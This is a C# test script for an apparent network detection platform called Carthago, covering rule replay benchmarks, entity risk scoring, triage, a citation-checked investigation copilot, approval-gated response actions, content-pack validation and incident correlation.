Assert(precisionReplayResult.RuleObservations.Any(o => o.RuleId == "R084" && o.MatchedCount > 0 && o.MaximumConfidence >= 0.01), "RuleReplayRunner must expose per-rule observation details.");

var benignPrecisionReplaySample = new Carthago.Services.Benchmarking.RuleReplaySample
{
    Name = "architecture-normal-http-nonmatch",
    Classification = Carthago.Services.Benchmarking.ReplaySampleClassification.Benign,
    Records =
    {
        new TrafficRecord
        {
            Source = "10.0.0.22",
            Destination = "93.184.216.34",
            Protocol = "HTTP",
            DestinationPort = 80,
            HttpMethod = "GET",
            HttpHost = "example.com",
            HttpUri = "/index.html",
            HttpUserAgent = "Mozilla/5.0"
        }
    },
    ExpectedNonMatches = { "R084", "R085", "R086" }
};
var benignReplayResult = await precisionReplayRunner.RunSampleAsync(benignPrecisionReplaySample, new Carthago.Services.Benchmarking.RuleReplayRunOptions
{
    TreatUnexpectedMatchesAsFailure = true,
    TreatBenignEmissionsAsFailure = false
});
Assert(benignReplayResult.Passed && !benignReplayResult.MatchedRuleIds.Contains("R084"), "RuleReplayRunner must assert expected engine-level non-matches.");
var noMatchReplayDir = System.IO.Path.Combine(tempRoot, "replay-nonmatch-coverage");
System.IO.Directory.CreateDirectory(noMatchReplayDir);
await System.IO.File.WriteAllTextAsync(
    System.IO.Path.Combine(noMatchReplayDir, "benign-nonmatch.json"),
    System.Text.Json.JsonSerializer.Serialize(benignPrecisionReplaySample));
var noMatchCoverageDirectory = await precisionReplayRunner.RunDirectoryAsync(noMatchReplayDir, new RuleReplayRunOptions
{
    TreatUnexpectedMatchesAsFailure = true,
    TreatBenignEmissionsAsFailure = false
});
Assert(!noMatchCoverageDirectory.Summary.RulesWithNoReplayCoverage.Contains("R084", StringComparer.OrdinalIgnoreCase), "Expected non-match assertions must count as replay coverage, not no-coverage gaps.");
Assert(new RuleReplayCoverageService().GetCoverage("R084", noMatchCoverageDirectory, descriptors).Status == RuleReplayCoverageStatus.BenignOnly, "Expected non-match replay assertions should produce benign replay coverage.");

var precisionReplayDirectory = await precisionReplayRunner.RunDirectoryAsync(System.IO.Path.Combine("Tests", "RuleReplaySamples"), new Carthago.Services.Benchmarking.RuleReplayRunOptions
{
    TreatUnexpectedMatchesAsFailure = true,
    TreatBenignEmissionsAsFailure = false
});
Assert(precisionReplayDirectory.Summary.SampleCount >= 1 && precisionReplayDirectory.Summary.PassedSampleCount >= 1, "RuleReplayRunner directory benchmark must summarize sample pass/fail state.");
var replayReportStore = new Carthago.Services.Benchmarking.RuleReplayReportStore();
var replayReportDir = System.IO.Path.Combine(tempRoot, "replay-report");
await replayReportStore.SaveAsync(precisionReplayDirectory, replayReportDir);
Assert(System.IO.File.Exists(replayReportStore.GetJsonPath(replayReportDir)), "RuleReplayReportStore must write JSON benchmark output.");
Assert(!System.IO.Directory.EnumerateFiles(replayReportDir, "*.md", System.IO.SearchOption.AllDirectories).Any(), "RuleReplayReportStore must not emit Markdown files.");
var replayCoverage = new Carthago.Services.Benchmarking.RuleReplayCoverageService().GetCoverage("R084", precisionReplayDirectory, descriptors);
Assert(replayCoverage.SampleCount >= 1 && replayCoverage.Status != Carthago.Services.Benchmarking.RuleReplayCoverageStatus.NoCoverage, "RuleReplayCoverageService must expose coverage status per rule.");
var healthSnapshotWithReplay = new RuleHealthSnapshotService(ruleProvider: () => registry, replayResultProvider: () => precisionReplayDirectory).Snapshot().Single(s => s.RuleId == "R084");
Assert(healthSnapshotWithReplay.ReplayCoverage.SampleCount >= 1, "Rule health snapshots must include replay coverage when a replay result is provided.");
var replayAwareDiagnostics = await new RuleHealthDiagnosticsService(benchmarkOutputDirectory: replayReportDir).SnapshotAsync();
Assert(replayAwareDiagnostics.Any(d => d.RuleId == "R084" && d.ReplaySampleCount >= 1 && d.ReplayCoverageStatus != "NoCoverage"), "Rule health diagnostics must include replay benchmark coverage loaded from JSON output.");



// ===== v6 platform foundation tests =====
var v6Root = System.IO.Path.Combine(tempRoot, "v6");
var v6Event1 = new DetectionEvent
{
    EventId = "evt-v6-1",
    RuleId = "R102",
    RuleName = "DNS Tunneling via Long Labels",
    TimestampUtc = DateTime.UtcNow.AddMinutes(-2),
    SourceIp = "10.0.0.50",
    DestinationIp = "8.8.8.8",
    DestinationPort = 53,
    Protocol = "DNS",
    Summary = "Long DNS label observed",
    Severity = SeverityLevel.High,
    ConfidenceScore = 0.84,
    ConfidenceLabel = DetectionConfidenceLabel.High,
    RuleMaturityAtDetection = "Candidate",
    RuleRevisionAtDetection = 1,
    DeliveryStatus = DetectionDeliveryStatus.Persisted,
    JournalPath = "test.jsonl"
};
var v6Event2 = new DetectionEvent
{
    EventId = "evt-v6-2",
    RuleId = "R103",
    RuleName = "DNS Beaconing With Stable Interval",
    TimestampUtc = DateTime.UtcNow.AddMinutes(-1),
    SourceIp = "10.0.0.50",
    DestinationIp = "8.8.4.4",
    DestinationPort = 53,
    Protocol = "DNS",
    Summary = "Stable DNS interval observed",
    Severity = SeverityLevel.Medium,
    ConfidenceScore = 0.70,
    ConfidenceLabel = DetectionConfidenceLabel.Medium,
    RuleMaturityAtDetection = "Candidate",
    RuleRevisionAtDetection = 1,
    DeliveryStatus = DetectionDeliveryStatus.Persisted,
    JournalPath = "test.jsonl"
};

var entityStore = new EntityGraphStore(new EntityGraphOptions { DirectoryPath = System.IO.Path.Combine(v6Root, "entity-graph") });
var entityIds = await entityStore.ObserveDetectionAsync(v6Event1);
await entityStore.ObserveDetectionAsync(v6Event2);
Assert(entityIds.Any(id => id.StartsWith("host:", StringComparison.OrdinalIgnoreCase)), "Entity graph should create host entity from detection.");
Assert((await entityStore.QueryNodesAsync()).Any(), "Entity graph should persist nodes.");
Assert((await entityStore.ReadEdgesAsync()).Any(), "Entity graph should persist edges.");

var riskEngine = new EntityRiskEngine();
var risks = riskEngine.ScoreDetections(new[] { v6Event1, v6Event2 });
Assert(risks.Any(r => r.Score > 0 && r.Reasons.Any(x => x.EvidenceEventId == v6Event1.EventId)), "Entity risk should cite EventIds in explainable reasons.");
var agedEvent = new DetectionEvent
{
    EventId = v6Event1.EventId + "-aged",
    RuleId = v6Event1.RuleId,
    RuleName = v6Event1.RuleName,
    TimestampUtc = DateTime.UtcNow.AddDays(-10),
    SourceIp = v6Event1.SourceIp,
    DestinationIp = v6Event1.DestinationIp,
    DestinationPort = v6Event1.DestinationPort,
    Protocol = v6Event1.Protocol,
    Summary = v6Event1.Summary,
    Severity = v6Event1.Severity,
    ConfidenceScore = v6Event1.ConfidenceScore,
    ConfidenceLabel = v6Event1.ConfidenceLabel,
    RuleMaturityAtDetection = v6Event1.RuleMaturityAtDetection,
    RuleRevisionAtDetection = v6Event1.RuleRevisionAtDetection,
    DeliveryStatus = DetectionDeliveryStatus.Persisted,
    JournalPath = "test.jsonl"
};
var agedRisk = riskEngine.ScoreDetections(new[] { agedEvent });
Assert(agedRisk[0].Score < risks[0].Score, "Time decay should reduce stale risk.");
var fpRisk = riskEngine.ScoreDetections(new[] { v6Event1 }, new[] { new DetectionFeedback { EventId = v6Event1.EventId, RuleId = v6Event1.RuleId, Verdict = DetectionFeedbackVerdict.FalsePositive } });
Assert(fpRisk[0].Score < riskEngine.ScoreDetections(new[] { v6Event1 })[0].Score, "False-positive feedback should reduce risk contribution.");

var incident = Incident.FromDetections(new[] { v6Event1, v6Event2 }, "DNS C2 suspicion", "high");
incident.StoryType = AttackStoryType.DnsC2Suspicion;
var triageCase = new TriageEngine().CreateCase(incident, risks);
Assert(triageCase.Decision.Severity is TriageSeverity.HighPriority or TriageSeverity.CriticalImmediate, "DNS C2 triage should be high priority.");
Assert(triageCase.SupportingEventIds.Contains(v6Event1.EventId), "Triage should cite journaled EventIds.");
var triageJson = System.Text.Json.JsonSerializer.Serialize(triageCase);
Assert(triageJson.Contains(v6Event1.EventId), "Triage output should survive JSON serialization.");

var copilotContext = new CopilotContextPack { Detections = { v6Event1, v6Event2 }, Incidents = { incident }, EntityRiskScores = risks.ToList(), TriageCases = { triageCase }, MissingTelemetryWarnings = { "sample missing telemetry" } };
var copilot = await new LocalInvestigationCopilot().AnswerAsync(copilotContext, "Why did this incident trigger?");
Assert(copilot.Citations.Any(c => c.SourceId == v6Event1.EventId) && copilot.Warnings.Any(), "Copilot should cite source IDs and explain missing evidence.");
Assert(CopilotGuardrails.HasCitations(copilot), "Copilot claims must be cited.");

var responseEngine = new ResponseRecommendationEngine(new ResponseOptions { DirectoryPath = System.IO.Path.Combine(v6Root, "response") });
var recommendations = responseEngine.Recommend(incident);
Assert(recommendations.Any(r => r.RequiresApproval), "High-priority response should include approval-required recommendations.");
var destructive = recommendations.First(r => r.RequiresApproval);
var execution = await responseEngine.ExecuteAsync(destructive, approved: false);
Assert(execution.Action.Result.Contains("approval", StringComparison.OrdinalIgnoreCase), "Destructive actions must not execute without approval.");

var timelineBuilder = new AttackTimelineBuilder();
var bundle = timelineBuilder.BuildBundle(incident, risks, new[] { new DetectionFeedback { EventId = v6Event1.EventId, RuleId = v6Event1.RuleId, Verdict = DetectionFeedbackVerdict.NeedsReview } }, recommendations);
Assert(bundle.RelatedEventIds.Contains(v6Event1.EventId), "Evidence bundle should preserve related EventIds.");
var markdown = new TimelineExportService().ExportMarkdown(bundle);
Assert(markdown.Contains(v6Event1.EventId), "Timeline export should include event IDs.");

var pack = new ContentPackManifest
{
    PackId = "carthago.iot-home.v1",
    Name = "IoT Home",
    Version = "1.0.0",
    Rules =
    {
        new ContentPackRule
        {
            RuleId = "IOTPACK001",
            Name = "IoT home broker alias",
            Category = "IoT",
            Description = "Content-pack alias for the compiled MQTT broker detector.",
            Source = new ContentPackRuleSource { CoreRuleId = "R113" }
        },
        new ContentPackRule
        {
            RuleId = "IOTPACK002",
            Name = "IoT device exposure alias",
            Category = "IoT",
            Description = "Content-pack alias for the compiled IoT exposure detector.",
            Source = new ContentPackRuleSource { CoreRuleId = "R114" }
        }
    },
    Profiles = { new ContentPackProfileDefaults { ProfileName = "IoTHeavy" } }
};
var packValidation = new ContentPackValidator().Validate(pack);
Assert(packValidation.IsValid, "Valid content pack should pass validation.");
var invalidPack = new ContentPackManifest
{
    PackId = "bad",
    Name = "Bad",
    Version = "1.0.0",
    Rules = { new ContentPackRule { RuleId = "BADPACK001", Source = new ContentPackRuleSource { CoreRuleId = "R999" } } },
    DisableMandatoryJournaling = true
};
Assert(!new ContentPackValidator().Validate(invalidPack).IsValid, "Invalid content pack should be rejected.");
var nullSourcePack = new ContentPackManifest
{
    PackId = "nullsource",
    Name = "Null source",
    Version = "1.0.0",
    Rules = { new ContentPackRule { RuleId = "NULLSRC001", Source = null! } }
};
Assert(!new ContentPackValidator().Validate(nullSourcePack).IsValid, "Content pack validator should reject null rule sources instead of throwing.");
Assert(new ContentPackInstaller().DryRun(pack).PlannedChanges.Any(), "Content pack installer dry-run should report planned changes.");
var contentPackUpgradeRoot = System.IO.Path.Combine(v6Root, "content-pack-upgrade");
var corruptContentPackStore = new ContentPackStore(System.IO.Path.Combine(v6Root, "corrupt-content-pack-store"));
System.IO.Directory.CreateDirectory(corruptContentPackStore.RootDirectory);
System.IO.File.WriteAllText(corruptContentPackStore.StatePath, "{not-json");
Assert(!corruptContentPackStore.Load().InstalledPacks.Any(), "Corrupt content-pack state should fail closed instead of crashing startup.");
System.IO.Directory.CreateDirectory(corruptContentPackStore.ManifestDirectory);
System.IO.File.WriteAllText(corruptContentPackStore.GetManifestPath("bad-manifest"), "{not-json");
Assert(corruptContentPackStore.LoadManifest("bad-manifest") == null, "Corrupt content-pack manifest should return null instead of crashing registry overlay.");
var contentPackUpgradeRegistry = new ContentPackRegistry(store: new ContentPackStore(contentPackUpgradeRoot));
var contentPackUpgradeInstaller = new ContentPackInstaller(contentPackUpgradeRegistry);
var contentPackInstall = contentPackUpgradeInstaller.Install(pack, enableAfterInstall: false, runBenchmark: false);
Assert(!contentPackInstall.Errors.Any(), "Valid content pack should install into an isolated store before upgrade validation tests.");
var invalidVersionUpgradePlan = contentPackUpgradeInstaller.PlanUpgrade(new ContentPackManifest
{
    PackId = pack.PackId,
    Name = pack.Name,
    Version = "not-semver",
    Rules =
    {
        new ContentPackRule
        {
            RuleId = "IOTPACK001",
            Name = "IoT home broker alias",
            Category = "IoT",
            Description = "Content-pack alias for the compiled MQTT broker detector.",
            Source = new ContentPackRuleSource { CoreRuleId = "R113" }
        }
    }
});
Assert(invalidVersionUpgradePlan.Errors.Any(error => error.Contains("valid semantic version", StringComparison.OrdinalIgnoreCase)), "Content pack upgrade planning should report invalid target versions instead of throwing.");
var duplicateRuleUpgradePlan = contentPackUpgradeInstaller.PlanUpgrade(new ContentPackManifest
{
    PackId = pack.PackId,
    Name = pack.Name,
    Version = "1.0.1",
    Rules =
    {
        new ContentPackRule { RuleId = "IOTPACK001", Source = new ContentPackRuleSource { CoreRuleId = "R113" } },
        new ContentPackRule { RuleId = "IOTPACK001", Source = new ContentPackRuleSource { CoreRuleId = "R113" } }
    }
});
Assert(duplicateRuleUpgradePlan.Errors.Any(error => error.Contains("Duplicate rule ID IOTPACK001", StringComparison.OrdinalIgnoreCase)), "Content pack upgrade planning should report duplicate target rule IDs instead of crashing.");

var sigmaExport = new SigmaRuleExporter().Export(registry.Single(r => r.Descriptor.RuleId == "R102"));
Assert(sigmaExport.Id == "R102" && sigmaExport.IsBehavioral && sigmaExport.References.Any(), "Sigma-like export should include metadata and behavioral marker.");
Assert(SuricataMapping.IsDirectPacketSignatureCandidate(registry.Single(r => r.Descriptor.RuleId == "R084")), "Payload rules should be signature candidates for reference mapping.");
Assert(ZeekFieldMapping.KnownSchemas.Any(z => z.LogName == "dns"), "Zeek DNS field mapping should exist.");

var sensor = SensorIdentity.LocalDefault();
sensor.ApplyTo(v6Event1);
Assert(!string.IsNullOrWhiteSpace(v6Event1.SensorId) && v6Event1.TenantId == "local", "Sensor identity should apply safe local defaults to detections.");
var sensorRegistry = new SensorRegistry(System.IO.Path.Combine(v6Root, "sensors"));
await sensorRegistry.RecordHeartbeatAsync(new SensorHeartbeat { SensorId = sensor.SensorId, ClockSkewMs = 125 });
Assert((await sensorRegistry.ReadHealthAsync()).Any(h => h.SensorId == sensor.SensorId), "Sensor heartbeat should persist.");

var hunt = new HuntQueryEngine().Execute(new HuntQuery { RuleId = "R102" }, new[] { v6Event1, v6Event2 }, new[] { incident }, risks);
Assert(hunt.Detections.Count == 1 && hunt.SourceIds.Contains(v6Event1.EventId), "Hunt query by RuleId should return cited event IDs.");
var shadowEvent = new DetectionEvent
{
    EventId = v6Event1.EventId + "-shadow",
    RuleId = v6Event1.RuleId,
    RuleName = v6Event1.RuleName,
    TimestampUtc = v6Event1.TimestampUtc,
    SourceIp = v6Event1.SourceIp,
    DestinationIp = v6Event1.DestinationIp,
    DestinationPort = v6Event1.DestinationPort,
    Protocol = v6Event1.Protocol,
    Summary = v6Event1.Summary,
    Severity = v6Event1.Severity,
    ConfidenceScore = v6Event1.ConfidenceScore,
    ConfidenceLabel = v6Event1.ConfidenceLabel,
    SuppressionStatus = DetectionSuppressionStatus.Shadowed
};
var huntSuppressed = new HuntQueryEngine().Execute(new HuntQuery { SuppressionStatus = DetectionSuppressionStatus.Shadowed }, new[] { shadowEvent });
Assert(huntSuppressed.Detections.Count == 1, "Hunt query should support shadow/suppressed events.");

var benchmark = await new BenchmarkRunner().RunAsync(new DetectionBenchmark { ReplayDirectory = System.IO.Path.Combine("Tests", "RuleReplaySamples") });
Assert(benchmark.Scorecard.ReplaySampleCount > 0, "Benchmark should run replay samples and create a scorecard.");
Assert(new EntityRiskViewModel { Items = risks.ToList() }.Items.Any(), "UI-ready entity risk view model should construct.");
Assert(new IncidentStoryViewModel { Incident = incident, RelatedRuleIds = incident.RelatedRuleIds }.RelatedRuleIds.Any(), "UI-ready incident story view model should construct.");

var correlationEngine = new Carthago.Analytics.Services.IncidentCorrelationEngine(TimeSpan.FromMinutes(15));
var identityCorrelationA = correlationEngine.Correlate(new DetectionEvent
{
    EventId = "corr-identity-a",
    RuleId = "R274",
    RuleName = "MFA Push Fatigue Pattern",
    TimestampUtc = DateTime.UtcNow.AddMinutes(-3),
    SourceIp = "10.0.0.70",
    DestinationHost = "login.microsoftonline.com",
    Protocol = "HTTPS",
    Severity = SeverityLevel.High,
    ConfidenceScore = 0.86,
    ConfidenceLabel = DetectionConfidenceLabel.High,
    Summary = "Repeated MFA push prompts"
});
var identityCorrelationB = correlationEngine.Correlate(new DetectionEvent
{
    EventId = "corr-identity-b",
    RuleId = "R282",
    RuleName = "VPN Login Followed By Internal Scan",
    TimestampUtc = DateTime.UtcNow.AddMinutes(-2),
    SourceIp = "10.0.0.70",
    DestinationIp = "10.0.1.10",
    DestinationPort = 445,
    Protocol = "TCP",
    Severity = SeverityLevel.High,
    ConfidenceScore = 0.88,
    ConfidenceLabel = DetectionConfidenceLabel.High,
    Summary = "VPN login followed by internal scan"
});
var correlatedIdentityIncident = identityCorrelationB.Incident;
Assert(!identityCorrelationB.IsNew && identityCorrelationA.Incident.Id == identityCorrelationB.Incident.Id, "Correlation engine should reuse the same source/family/window incident.");
Assert(correlatedIdentityIncident.StoryType == AttackStoryType.IdentityCompromiseSuspicion, "Identity correlation should promote the incident to an identity compromise story.");
Assert(correlatedIdentityIncident.CorrelationReasons.Any(r => r.Code == "RULE_MATCH") && correlatedIdentityIncident.CorrelationReasons.Any(r => r.Code == "ATTACK_STORY"), "Incident correlation should store structured reasons.");
Assert(correlatedIdentityIncident.ReasonGraph.Nodes.Any(n => n.Type == "Rule" && n.Id.Contains("r274", StringComparison.OrdinalIgnoreCase)), "Reason graph should include rule nodes.");
Assert(correlatedIdentityIncident.ReasonGraph.Edges.Any(e => e.Relationship == "matched_rule"), "Reason graph should include matched_rule edges.");
Assert(correlatedIdentityIncident.RelatedEntities.Any(e => e.StartsWith("host:", StringComparison.OrdinalIgnoreCase)), "Incident should expose related graph entity ids.");
Assert(correlatedIdentityIncident.CorrelationStrengthScore > 0 && correlatedIdentityIncident.ConfidenceScore >= correlatedIdentityIncident.CorrelationStrengthScore, "Correlation scoring should produce a bounded strength score and lift confidence.");
var correlationSummary = new Carthago.Analytics.Services.IncidentReasonGraphBuilder().BuildSummary(correlatedIdentityIncident);
Assert(correlationSummary.RelatedRuleCount >= 2 && correlationSummary.ReasonCount >= 2 && correlationSummary.TopReasons.Any(), "Correlation summary should be UI-ready.");

Console.WriteLine("Carthago rule architecture tests passed.");


sealed class SyntheticRule : DetectionRuleBase
{
    private readonly bool _attachPrecisionProfile;

    public SyntheticRule(string ruleId, string configKey, bool attachPrecisionProfile = true)
    {
        Descriptor = new RuleDescriptor(ruleId, "Synthetic Rule", "Synthetic", "Synthetic rule for rule-health architecture tests.", SeverityLevel.Low, configKey, true);
        _attachPrecisionProfile = attachPrecisionProfile;
    }

    public override RuleDescriptor Descriptor { get; }

    public override RuleIntelligence Intelligence
    {
        get
        {
            var baseline = RuleIntelligenceFactory.CreateDefault(Descriptor);
            return baseline with { PrecisionProfile = _attachPrecisionProfile ? baseline.PrecisionProfile : null };
        }
    }

    public override ValueTask<RuleEvaluationResult> EvaluateAsync(RuleEvaluationContext context, CancellationToken cancellationToken = default)
        => ValueTask.FromResult(RuleEvaluationResult.NoMatch(Descriptor.RuleId));
}
